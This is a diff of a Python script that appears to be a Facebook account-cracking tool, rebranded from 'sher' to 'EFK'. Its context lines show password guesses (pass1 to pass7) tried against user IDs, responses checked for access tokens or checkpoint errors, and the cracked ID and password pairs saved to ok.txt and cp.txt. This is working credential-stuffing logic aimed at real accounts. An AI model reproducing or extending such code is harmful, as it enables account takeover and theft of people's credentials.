@@ -85,7 +85,7 @@ logo = """
 
 \033[1;96m(~)\033[1;97m Fb     : https://www.facebook.com/itz.efk.3
 
-\033[1;97m-----------------------------------------------
+\033[1;97m-------------------------------------------------------------------------
 
 """
 
@@ -560,7 +560,7 @@ def menu_select():
 
 		    if 'www.facebook.com' in d['error_msg']:
 
-		        print("[sher-hacked] "+uid+" | "+pass1)
+		        print("[EFK-hacked] "+uid+" | "+pass1)
 
 		        cp=open("ok.txt","a")
 
@@ -594,7 +594,7 @@ def menu_select():
 
 		            if 'www.facebook.com' in d['error_msg']:
 
-		                print("[sher-cp] "+uid+" | "+pass2)
+		                print("[EFK-cp] "+uid+" | "+pass2)
 
 		                cp=open("cp.txt","a")
 
@@ -628,7 +628,7 @@ def menu_select():
 
 		                    if 'www.facebook.com' in d['error_msg']:
 
-		                        print("[sher-hacked] "+uid+" | "+pass3)
+		                        print("[EFK-hacked] "+uid+" | "+pass3)
 
 		                        cp=open("ok.txt","a")
 
@@ -662,7 +662,7 @@ def menu_select():
 
 		                            if 'www.facebook.com' in d['error_msg']:
 
-		                                print("[sher-cp] "+uid+" | "+pass4)
+		                                print("[EFK-cp] "+uid+" | "+pass4)
 
 		                                cp=open("cp.txt","a")
 
@@ -710,7 +710,7 @@ def menu_select():
 
 		                                        if 'access_token' in d:
 
-		                                            print("\x1b[1;96m[sher-_hacked] "+uid+" | "+pass5+"\x1b[1;0m")
+		                                            print("\x1b[1;96m[EFK-_hacked] "+uid+" | "+pass5+"\x1b[1;0m")
 
 		                                            ok=open("ok.txt","a")
 
@@ -730,7 +730,7 @@ def menu_select():
 
 		                                            if 'www.facebook.com' in d['error_msg']:
 
-		                                                print("[sher-cp] "+uid+" | "+pass6)
+		                                                print("[EFK-cp] "+uid+" | "+pass6)
 
 		                                                cp=open("cp.txt","a")
 
@@ -764,7 +764,7 @@ def menu_select():
 
 		                                                    if 'www.facebook.com' in d['error_msg']:
 
-		                                                        print("[sher-cp] "+uid+" | "+pass7)
+		                                                        print("[EFK-cp] "+uid+" | "+pass7)
 
 		                                                        cp=open("cp.txt","a")
 
